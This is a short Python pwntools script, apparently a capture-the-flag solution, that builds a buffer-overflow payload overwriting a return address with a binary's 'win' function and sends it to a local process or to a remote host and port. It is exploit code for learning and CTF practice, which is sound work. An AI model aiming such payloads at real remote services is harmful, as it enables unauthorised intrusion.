#!/usr/bin/env python3

import argparse
import pwn

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, default="", required=False)
parser.add_argument("--port", "-p", type=int, default=0, required=False)
args = parser.parse_args()

elf = pwn.ELF("/binary/file/path")

offset = 32

new_ret = pwn.p64(elf.symbols["win"])
ret_main = pwn.p64(elf.symbols["main"])
print(new_ret)
payload = b"".join(
    [
        b"a" * offset,
        new_ret,
    ]
)

payload += b"\n"

with open("payload", "wb") as file:
    file.write(payload)

if args.destination == "local":
    p = elf.process()
elif args.destination == "remote":
    if not args.target or not args.port:
        pwn.warning("supply target and port")
        exit()
    p = pwn.remote(args.target, args.port)

#p.send("2")
#p.recv()
p.sendline(payload)
p.interactive()